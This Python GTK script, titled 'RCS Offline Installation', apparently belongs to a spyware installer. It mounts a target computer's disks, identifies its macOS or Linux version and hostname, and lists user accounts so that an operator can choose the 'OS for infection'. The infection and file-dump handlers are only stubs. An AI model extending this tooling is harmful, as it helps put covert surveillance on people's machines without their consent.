#!/usr/bin/env python3
#

from gi.repository import Gtk, GObject
import subprocess
import sys
import signal
import os
import json

class OfflineInstall(object):
	builder = None
	liststore = None
	window = None
	scroll = None
	treeview = None
	status = False
	exsosx = False
	tabosx = None
	useosx = None
	exslin = False
	tablin = None
	uselin = None

	def __init__(self):
		self.builder = Gtk.Builder()
		self.builder.add_from_file("/opt/offline-install/offline_gui.glade")
		self.builder.connect_signals(self)
		self.window = self.builder.get_object("window1")

		self.window.set_title("RCS Offline Installation")
		self.window.connect("delete-event", Gtk.main_quit)
		self.window.set_default_size(1, 520)

		self.scroll = self.builder.get_object("scrolledwindow1")
		self.liststore = self.builder.get_object("liststore1")
		self.treeview = self.builder.get_object("treeview1")

		renderer_text0 = Gtk.CellRendererText()
		column_text0 = Gtk.TreeViewColumn("Name", renderer_text0, text = 0)
		self.treeview.append_column(column_text0)

		renderer_text1 = Gtk.CellRendererText()
		column_text1 = Gtk.TreeViewColumn("Full Name", renderer_text1, text = 1)
		self.treeview.append_column(column_text1)

		self.start()

	#
	# Start all modules
	##
	def start(self):
		self.load_modules()
		self.load_systems()

	#
	# Stop all modules
	##
	def stop(self):
		self.unload_modules()

	#
	# Load file systems kernel modules
	##
	def load_modules(self):
		ret = int(subprocess.check_output('lsmod | grep -i ufsd | wc -l', shell=True)[:-1])

		if ret == 0:
			print("Loading ufsd kernel module...")
			subprocess.call("modprobe ufsd", shell=True)
		else:
			print("ufsd kernel module is loaded.")

	#
	# Unload file systems kernel modules
	##
	def unload_modules(self):
		print("Unloading ufsd kernel module...")
		subprocess.call("rmmod ufsd", shell=True)	
		subprocess.call("rmmod jnl", shell=True)

	#
	# Search hard disk devices
	##
	def check_devices(self):
		devs = os.listdir('/dev/')
		hds = []

		print("Searching hd devices...")

		for i in devs:
			if i.find("sd") != -1:
				if len(i) == 3:
					print("  Found: /dev/" + i)
					hds.append(i)

		if hds == []:
			print("  Not found: Hd devices")
			return None

		return [devs, hds]

	#
	# Search partitions of each hard disk device
	##
	def check_partitions(self):
		devs, hds = self.check_devices()
		parts = []

		if hds == None:
			return None

		for i in hds:
			print("Searching partitions on /dev/" + i + " device...")

			for j in devs:
				if j.find(i) != -1:
					if len(j) > 3:
						print("  Found: /dev/" + j)
						parts.append(j)

		if parts == []:
			print("  Not found: Hd partitions")
			return None

		return parts

	#
	# Search filesystem of each partition of each hard disk device
	##
	def check_filesystems(self):
		parts = self.check_partitions()
		fs = ['ufsd', 'ext4', 'reiserfs', 'ext3', 'ext2', 'xfs', 'jfs']
		tablefs = []
	
		if parts == None:
			return None

		print("Check filesystems on partitions...")

		try:
	                ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
		except:
                        pass

		for i in parts:
			for j in fs:
				try:
					ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(j, i), shell=True)
					os = None

					if j == 'ufsd':
						os = 'os x'
					else:
						os = 'linux'

					print("  Found: " + os + " -> /dev/" + i + " -> " + j)
					tablefs.append([os, i, j])
				except:
					pass

				try:
					ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
				except:
					pass
		
		if tablefs == []:
			print("  Not found: Hd filesystems")
			return None

		return tablefs

	#
	# Search mount point of each filesystem of each partition of each hard disk divice
	##
	def check_mount(self):
		tablefs = self.check_filesystems()
		tablemount = []

		if tablefs == None:
			return None

		print("Check mount point on filesystems...")

		for i in tablefs:
			try:
				ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(i[2], i[1]), shell=True)

				if i[0] == 'os x' and os.path.exists('/mnt/mach_kernel') == True:
					mountpoint = '/'

					print("  Found: " + i[0] + " -> /dev/" + i[1] + " -> " + i[2] + " -> " + mountpoint)
					self.exsosx = True
					tablemount.append([i[0], i[1], i[2], mountpoint])
				elif i[0] == 'linux':
					ret = int(subprocess.check_output("cat /mnt/etc/fstab | grep -v '#' | grep -i UUID | wc -l", shell=True)[:-1])
					uuid_sup = None

					if ret != 0:
						uuid_sup = "UUID"
						uuid = subprocess.check_output("blkid | grep -i '{}' | awk '{{print $2}}'".format(i[1]), shell=True)[6:-2].decode('utf-8')
						mountpoint = subprocess.check_output("cat /mnt/etc/fstab | grep -v '#' | grep -i {} | awk '{{print $2}}'".format(uuid), shell=True)[:-1].decode('utf-8')
					else:
						uuid_sup = "NO UUID"
						mountpoint = subprocess.check_output("cat /mnt/etc/fstab | grep -v '#' | grep -i {} | awk '{{print $2}}'".format(i[1]), shell=True)[:-1].decode('utf-8')

					print("  Found: " + i[0] + " -> /dev/" + i[1] + " -> " + i[2] + " -> " + uuid_sup + ' -> ' + mountpoint)
					self.exslin = True
					tablemount.append([i[0], i[1], i[2], mountpoint])
			except:
				pass

			try:
				ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
			except:
				pass

		if tablemount == []:
			print("  Not found: Hd filesystems mount point")
			return None

		return tablemount

	#
	# Search OS X system of each mount point of each filesystem of each partition of each hard disk divice
	##
	def check_osx_system(self, tablemount):
		tableosx = {}

		print("  Check OS X system on mount points...")

		for i in tablemount:
			if i[0] == 'os x' and i[3] == '/':
				tableosx.update({'rootdisk': i[1]})
				tableosx.update({'rootfs': i[2]})
				tableosx.update({'rootmount': i[3]})
				break

		if tableosx == {}:
			print("    Not found: Hd OS X system")
		else:
			print("    Found: Hd OS X system")

		return tableosx

	#
	# Search Linux system of each mount point of each filesystem of each partition of each hard disk divice
	##
	def check_linux_system(self, tablemount):
		tablelinux = {}

		print("  Check Linux system on mount points...")

		for i in tablemount:
			if i[0] == 'linux' and i[3] == '/':
				tablelinux.update({'rootdisk': i[1]})
				tablelinux.update({'rootfs': i[2]})
				tablelinux.update({'rootmount': i[3]})
			elif i[2] == 'linux' and i[3] == ('/home' or '/home/'):
				tablelinux.update({'homedisk': i[1]})
				tablelinux.update({'homefs': i[2]})
				tablelinux.update({'homemount': i[3]})
			elif i[2] == 'linux' and i[3] == ('/var' or '/var/'):
				tablelinux.update({'vardisk': i[1]})
				tablelinux.update({'varfs': i[2]})
				tablelinux.update({'varmount': i[3]})

		if ('homedisk' in tablelinux) == False:
			tablelinux.update({'homedisk': None})
			tablelinux.update({'homefs': None})
			tablelinux.update({'homemount': "/home"})
		if ('vardisk' in tablelinux) == False:
			tablelinux.update({'vardisk': None})
			tablelinux.update({'varfs': None})
			tablelinux.update({'varmount': "/var"})

		if tablelinux == {}:
			print("    Not found: Hd Linux system")
		else:
			print("    Found: Hd Linux system")

		return tablelinux

	#
	# Search OS systems of each mount point of each filesystem of each partition of each hard disk divice
	##
	def check_ossystems(self):
		tablemount = self.check_mount()
		tableosx = {}
		tablelinux = {}

		if tablemount == None:
			return False

		print("Check OS systems on mount points...")

		tableosx = self.check_osx_system(tablemount)
		if tableosx == {}:
			self.tabosx = None
		else:
			self.tabosx = tableosx

		tablelinux = self.check_linux_system(tablemount)
		if tablelinux == {}:
			self.tablin = None
		else:
			self.tablin = tablelinux

		if tableosx == {} and tablelinux == {}:
			print("  Not found: Hd OS systems")
			return False

		return True

	#
	# Search OS X system users
	##
	def check_osx_users(self):
		self.useosx = []

		print("    Check OS X system users...")

		users = os.listdir('/mnt/Users/')

		for i in users:
			if i[0] == '.' or i == "shared" or i == "Shared":
				continue

			self.useosx.append({'username': i, 'home': '/Users/' + i})

		if self.useosx == []:
			self.useosx = None
			return False

		return True

	#
	# Search OS X system configurations
	##
	def check_osx_config(self):
		osproduct = "Mac OS X"
		osversion = ""
		oscode = ""
		osname = ""
		osarch = "64"
		ossupport = False
		haveuser = False

		print("  Check OS X system configuration...")

		try:
			ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(self.tabosx['rootfs'], self.tabosx['rootdisk']), shell=True)
		except:
			print("    Not found: OS X system configuration")
			return False

		try:
			name = subprocess.check_output("awk -F'<|>' '/ProductName/ {getline; print$3}' /mnt/System/Library/CoreServices/SystemVersion.plist", shell=True)[:-1].decode('utf-8')
			osproduct = name
		except:
			pass

		self.tabosx.update({'osproduct': osproduct})

		try:
			version = subprocess.check_output("awk -F'<|>' '/ProductVersion/ {getline; print$3}' /mnt/System/Library/CoreServices/SystemVersion.plist", shell=True)[:-1].decode('utf-8')
			osversion = version
		except:
			osversion = None
			pass

		self.tabosx.update({'osversion': osversion})

		if osversion == "10.5":
			oscode = "Leopard"
		elif osversion == "10.6":
			oscode = "Snow Leopard"
		elif osversion == "10.7":
			oscode = "Lion"
		elif osversion == "10.8":
			oscode = "Mountain Lion"
		elif osversion == "10.9":
			oscode = "Mavericks"

		self.tabosx.update({'oscode': oscode})

		try:
			osname = subprocess.check_output("awk -F'<|>' '/LocalHostName/ {getline; print$3}' /mnt/Library/Preferences/SystemConfiguration/preferences.plist", shell=True)[:-1].decode('utf-8')
		except:
			osname = None
			pass

		self.tabosx.update({'osname': osname})
		self.tabosx.update({'osarch': osarch})

		if osversion == "10.5" or osversion == "10.6" or osversion == "10.7" or osversion == "10.8" or osversion == "10.9":
			ossupport = True

		self.tabosx.update({'ossupport': ossupport})

		self.tabosx.update({'imgon': "/opt/offline-install/imagine/macos-on.bmp"})
		self.tabosx.update({'imgoff': "/opt/offline-install/imagine/macos-off.bmp"})

		haveuser = self.check_osx_users()
		if haveuser == False:
			 print("      Not found: OS X system users")
		else:
			 print("      Found: OS X system users")

		try:
			ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
		except:
			print("    Not found: OS X system configuration")
			return False

		if haveuser == False:
			print("    Not found: OS X system configuration")
			return False

		print("    Found: OS X system configuration")
		return True

	#
	# Search Linux OS system users
	##
	def check_linux_users(self):
		self.uselin = []

		print("    Check Linux system users...")

		users = os.listdir('/mnt/home/')

		for i in users:
			if i[0] == '.':
				continue

			self.uselin.append({'username': i, 'home': '/home/' + i})

		if self.uselin == []:
			self.uselin = None
			return False

		return True

	#
	# Search Linux OS system configurations
	##
	def check_linux_config(self):
		osproduct = "Linux"
		osversion = ""
		oscode = ""
		osname = ""
		osarch = "32"
		ossupport = True
		haveuser = False

		print("  Check Linux system configuration...")

		try:
			ret = subprocess.check_output("mount -t {} /dev/{} /mnt/ 2> /dev/null".format(self.tablin['rootfs'], self.tablin['rootdisk']), shell=True)
		except:
			print("    Not found: Linux system configuration")
			return False

		if os.path.exists('/mnt/etc/lsb-release') == True:
			distros = ['Ubuntu', 'Mint', 'Mageia']

			for i in distros:
				try:
					if int(subprocess.check_output("cat /mnt/etc/lsb-release | grep -i 'DISTRIB_ID=' | grep -i '{}' | wc -l".format(i), shell=True)[:-1]) != 0:
						osproduct += ' ' + i
						break
				except:
					pass

			try:
				osversion = subprocess.check_output("cat /mnt/etc/lsb-release | grep -i 'DISTRIB_RELEASE='", shell=True)[16:-1].decode('utf-8')
			except:
				pass

			try:
				oscode = subprocess.check_output("cat /mnt/etc/lsb-release | grep -i 'DISTRIB_CODENAME='", shell=True)[17:-1].decode('utf-8')
			except:
				pass
		elif os.path.exists('/mnt/etc/debian_version') == True:
			osproduct += " Debian"

			try:
				oscode = subprocess.check_output("cat /mnt/etc/debian_version", shell=True)[:-1].decode('utf8')
			except:
				pass				
		elif os.path.exists('/mnt/etc/fedora-release') == True:
			osproduct += " Fedora"

			try:
				osversion = subprocess.check_output("cat /mnt/etc/fedora-release | awk '{print $3}'", shell=True)[:-1].decode('utf-8')
			except:
				pass

			try:
				oscode = subprocess.check_output("cat /mnt/etc/fedora-release | awk '{print $4}'", shell=True)[1:-2].decode('utf-8')
			except:
				pass
	
		self.tablin.update({'osproduct': osproduct})
		self.tablin.update({'osversion': osversion})
		self.tablin.update({'oscode': oscode})

		try:
			osname = subprocess.check_output('cat /mnt/etc/hostname', shell=True)[:-1].decode('utf-8')
		except:
			osname = None
			pass

		try:
			if int(subprocess.check_output("file /mnt/bin/uname | grep '32-bit' | wc -l", shell=True)[:-1]) == 0:
				osarch = "64"
		except:
			pass

		self.tablin.update({'osname': osname})
		self.tablin.update({'osarch': osarch})
		self.tablin.update({'ossupport': ossupport})

		self.tablin.update({'imgon': "/opt/offline-install/imagine/linux-on.bmp"})
		self.tablin.update({'imgoff': "/opt/offline-install/imagine/linux-off.bmp"})

		haveuser = self.check_linux_users() 
		if haveuser == False:
			print("      Not found: Linux system users")
		else:
			print("      Found: Linux system users")

		try:
			 ret = subprocess.check_output("umount /mnt/ 2> /dev/null", shell=True)
		except:
			print("    Not found: Linux system configuration")
			return False

		if haveuser == False:
			print("    Not found: Linux system configuration")
			return False

		print("    Found: Linux system configuration")
		return True

	#
	# Show all OS systems configuration and users
	##
	def print_osreports(self):
		print("")
		print("Reports:")
		print("")

		if self.tabosx == None:
			print("Mac OS X:")
			print("{")
			print("  None")
			print("}")
		else:
			print("Mac OS X:")
			print(json.dumps(self.tabosx, indent = 1, sort_keys = True))
			print(json.dumps(self.useosx, indent = 1, sort_keys = True))

		if self.tablin == None:
			print("Linux:")
			print("{")
			print("  None")
			print("}")
		else:
			print("Linux:")
			print(json.dumps(self.tablin, indent = 1, sort_keys = True))
			print(json.dumps(self.uselin, indent = 1, sort_keys = True))

	#
	# Search OS configurations of each OS system
	##
	def check_osconfigs(self):
		if self.check_ossystems() == False:
			return False

		print("Check OS systems configuration...")

		if self.tabosx != None:
			if self.check_osx_config() == False:
				self.tabosx = None

		if self.tablin != None:
			if self.check_linux_config() == False:
				self.tablin = None

		if self.tabosx == None and self.tablin == None:
			print("  Not found: Hd OS systems configuration")
			return False
		else:
			self.print_osreports()

		return True

	#
	# Load all OS systems confiuration and users
	##
	def load_systems(self):
		self.status = self.check_osconfigs()

		self.treeview.show()
		self.scroll.show()
		self.window.show()

		self.builder.get_object("comboboxtext1").remove_all()
		self.builder.get_object("liststore1").clear()
		self.builder.get_object("comboboxtext1").set_sensitive(False)
		self.builder.get_object("treeview1").set_sensitive(False)
		self.builder.get_object("buttonbox3").set_sensitive(False)

		if self.status == False and self.exsosx == False and self.exslin == False:
			dialog = self.builder.get_object("messagedialog1")
			response = dialog.run()
			if response == Gtk.ResponseType.CLOSE:
				dialog.hide()
				return

		self.builder.get_object("image1").clear()
		self.builder.get_object("label3").set_label("")
		self.builder.get_object("label4").set_label("")
		self.builder.get_object("comboboxtext1").set_sensitive(True)
		self.builder.get_object("treeview1").set_sensitive(True)
		self.builder.get_object("buttonbox3").set_sensitive(True)

		if self.tabosx != None:
			self.builder.get_object("comboboxtext1").prepend_text("Mac OS X")

		if self.tablin != None:
			self.builder.get_object("comboboxtext1").prepend_text("Linux")

		self.builder.get_object("comboboxtext1").set_active(0)

	#
	# User selects the correct OS for infection
	##
	def select_os(self, *args):
		if self.builder.get_object("comboboxtext1").get_active_text() == "Mac OS X":
			self.builder.get_object("liststore1").clear()

			if self.status == True and self.exsosx == True:
				self.builder.get_object("image1").set_from_file(self.tabosx['imgon'])
				self.builder.get_object("label3").set_label("Computer Name: " + self.tabosx['osname'])

				output = "OS Version: " + self.tabosx['osproduct'] + ' ' + self.tabosx['osversion'] + ' ' + self.tabosx['oscode'] + " (" + self.tabosx['osarch'] + "-bit)"
				self.builder.get_object("label4").set_label(output)

				for i in self.useosx:
					self.builder.get_object("liststore1").append([i['username'], ""])

				self.builder.get_object("treeview1").set_sensitive(True)
				self.builder.get_object("buttonbox3").set_sensitive(True)
			else:
				self.builder.get_object("image1").set_from_file(self.tabosx['imgoff'])	
				self.builder.get_object("label3").set_label("Computer Name: Mac OS X")
				self.builder.get_object("label4").set_label("OS Version: unknown")

				self.builder.get_object("treeview1").set_sensitive(False)
				self.builder.get_object("buttonbox3").set_sensitive(False)
		elif self.builder.get_object("comboboxtext1").get_active_text() == "Linux":
			self.builder.get_object("liststore1").clear()

			if self.status == True and self.exslin == True:
				self.builder.get_object("image1").set_from_file(self.tablin['imgon'])
				self.builder.get_object("label3").set_label("Computer Name: " + self.tablin['osname'])

				output = "OS Version: " + self.tablin['osproduct']

				if self.tablin['osversion'] != "":
					output += ' ' + self.tablin['osversion']

				if self.tablin['oscode'] != "":
					output += ' ' + self.tablin['oscode']

				output += ' (' + self.tablin['osarch'] + "-bit)"
				self.builder.get_object("label4").set_label(output)

				for i in self.uselin:
					self.builder.get_object("liststore1").append([i['username'], ""])

				self.builder.get_object("treeview1").set_sensitive(True)
				self.builder.get_object("buttonbox3").set_sensitive(True)
			else:
				self.builder.get_object("image1").set_from_file(self.tablin['imgoff'])
				self.builder.get_object("label3").set_label("Computer Name: Linux")
				self.builder.get_object("label4").set_label("OS Version: unknown")

				self.builder.get_object("treeview1").set_sensitive(False)
				self.builder.get_object("buttonbox3").set_sensitive(False)
		else:
			self.builder.get_object("liststore1").clear()
			self.builder.get_object("image1").clear()
			self.builder.get_object("label3").set_label("")
			self.builder.get_object("label4").set_label("")

			self.builder.get_object("treeview1").set_sensitive(False)
			self.builder.get_object("buttonbox3").set_sensitive(False)

	#
	# Rescan all OS systems configurations and users
	##
	def rescan(self, *args):
		self.start()

	def install(self, *args):
		print("INSTALL")

	def uninstall(self, *args):
		print("UNINSTALL")

	def export_log(self, *args):
		print("EXPORT LOG")

	def dump_files(self, *args):
		print("DUMP FILES")

	#
	# Halt the machine
	##
	def halt(self, *args):
		self.stop()
		sys.exit(0)

	#
	# Reboot the machine
	##
	def reboot(self, *args):
		self.stop()
		subprocess.call("reboot", shell=True)
	
def signal_handler(signum, frame):
	print("Signal caught.")
	sys.exit()

	return

def main():
	signal.signal(signal.SIGINT, signal_handler)
	signal.signal(signal.SIGTERM, signal_handler)

	OfflineInstall()
	Gtk.main()

	return

if __name__ == "__main__":
	main()
